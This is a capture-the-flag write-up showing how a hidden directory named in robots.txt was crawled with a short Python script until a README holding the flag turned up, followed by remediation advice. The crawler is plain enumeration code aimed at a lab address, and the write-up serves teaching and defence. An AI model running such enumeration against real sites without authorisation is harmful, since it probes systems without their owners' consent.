# Hidden Directory File Discovery

## Summary

This breach is located in the hidden directory disclosed by `robots.txt`:

```txt
/.hidden/
```

The directory contains many nested folders. Each folder may contain a `README` file.

Most of the `README` files contain:

```txt
Nope
```

One of them contains the real flag.

To find it, I used a small custom crawler that recursively visits every directory under `/.hidden/`, reads each `README` file, and prints the one whose content is not `Nope`.

```txt
Flag: PUT_THE_FLAG_HERE
```

## How I Discovered It

During the previous enumeration, I opened:

```txt
http://192.168.56.101/robots.txt
```

It contained:

```txt
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

The `/.hidden/` path was publicly accessible.

When opened in the browser, it showed directory listing with many subdirectories. Because the directory tree was large, checking every folder manually would be slow and error-prone.

## Exploitation Approach

The idea was:

1. Start at `http://192.168.56.101/.hidden/`.
2. Parse all links on the page.
3. Ignore the parent directory link `../`.
4. If the link is `README`, fetch it and check its content.
5. If the content is not `Nope`, print it.
6. If the link is a directory, recursively crawl it.

## Crawler Script

```python
import requests
from bs4 import BeautifulSoup

BASE_URL = "http://192.168.56.101/.hidden/"

def crawl(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    for link in soup.find_all("a"):
        href = link.get("href")

        # skip parent directory
        if not href or href == "../":
            continue

        # if it's a README, fetch and print it
        if href == "README":
            readme = requests.get(url + href).text.strip()
            if readme != "Nope" and readme:
                print(f"[FOUND] {url + href}")
                print(f"Content: {readme}\n")

        # if it's a directory, recurse into it
        elif href.endswith("/"):
            crawl(url + href)

crawl(BASE_URL)
```

## Script Explanation

The script uses:

```python
requests.get(url)
```

to fetch each directory page.

Then it uses BeautifulSoup:

```python
BeautifulSoup(response.text, "html.parser")
```

to parse the HTML and find all links:

```python
soup.find_all("a")
```

The crawler skips parent directory links:

```python
if not href or href == "../":
    continue
```

When it finds a `README`, it fetches the file:

```python
readme = requests.get(url + href).text.strip()
```

Most README files contain:

```txt
Nope
```

So the script only prints README files with different content:

```python
if readme != "Nope" and readme:
```

If a link ends with `/`, the script treats it as a directory and crawls it recursively:

```python
elif href.endswith("/"):
    crawl(url + href)
```

## Why This Is Vulnerable

The server exposes a hidden directory through `robots.txt` and allows public directory listing.

The problem is not only that the directory is hidden. The problem is that it is accessible without authentication and contains sensitive data.

`robots.txt` does not protect files. It only gives instructions to search engine crawlers. Attackers can read it directly.

Directory listing also makes the problem worse because it lets an attacker browse the folder tree and discover files.

## Impact

An attacker can discover sensitive files that were not linked from the normal website.

In this case, recursive discovery of the exposed `/.hidden/` directory led to a `README` file containing the flag.

## How To Prevent It

Recommended fixes:

- Do not store sensitive files inside the public web root.
- Do not rely on `robots.txt` for security.
- Disable directory listing.
- Require authentication for private directories.
- Use proper access control rules on the web server.
- Remove unnecessary files from production.
- Monitor access to unusual or sensitive paths.

The main lesson is:

```txt
Hidden paths are not protected paths. If a file is reachable by URL, an attacker can find it.
```
